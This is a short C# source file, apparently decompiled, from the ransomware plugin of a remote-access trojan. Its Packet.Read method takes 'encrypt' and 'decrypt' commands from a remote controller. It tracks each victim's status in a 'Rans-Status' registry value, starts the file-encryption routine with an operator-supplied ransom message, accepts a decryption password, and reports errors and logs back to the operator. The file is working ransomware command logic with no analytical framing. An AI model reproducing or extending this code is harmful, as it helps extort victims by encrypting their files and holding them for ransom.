using System;
using System.Threading;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Plugin.Handler;

namespace Plugin;

public static class Packet
{
	public static void Read(object data)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.DecodeFromBytes((byte[])data);
			string asString = msgPack.ForcePathObject("Pac_ket").AsString;
			if (!(asString == "encrypt"))
			{
				if (asString == "decrypt")
				{
					if (Conversions.ToBoolean((object)Operators.ConditionalCompareObjectEqual(Registry.GetValue("HKEY_CURRENT_USER\\Software\\" + Connection.Hwid, "Rans-Status", null), (object)"Decrypted", false)))
					{
						Error(Connection.Hwid + "Already decrypted!");
						return;
					}
					HandleDecrypt obj = new HandleDecrypt
					{
						Pass = msgPack.ForcePathObject("Password").AsString
					};
					Thread.Sleep(1000);
					obj.BeforeDec();
				}
			}
			else if (Conversions.ToBoolean((object)Operators.ConditionalCompareObjectEqual(Registry.GetValue("HKEY_CURRENT_USER\\Software\\" + Connection.Hwid, "Rans-Status", null), (object)"Encrypted", false)))
			{
				Error(Connection.Hwid + "Already Encrypted!");
			}
			else
			{
				HandleEncrypt obj2 = new HandleEncrypt
				{
					Mynote = msgPack.ForcePathObject("Message").AsString
				};
				Thread.Sleep(1000);
				obj2.BeforeAttack();
			}
		}
		catch (Exception ex)
		{
			Error(ex.Message);
		}
	}

	public static void Error(string ex)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "Error";
		msgPack.ForcePathObject("Error").AsString = ex;
		Connection.Send(msgPack.Encode2Bytes());
	}

	public static void Log(string message)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "Logs";
		msgPack.ForcePathObject("Message").AsString = message;
		Connection.Send(msgPack.Encode2Bytes());
	}
}
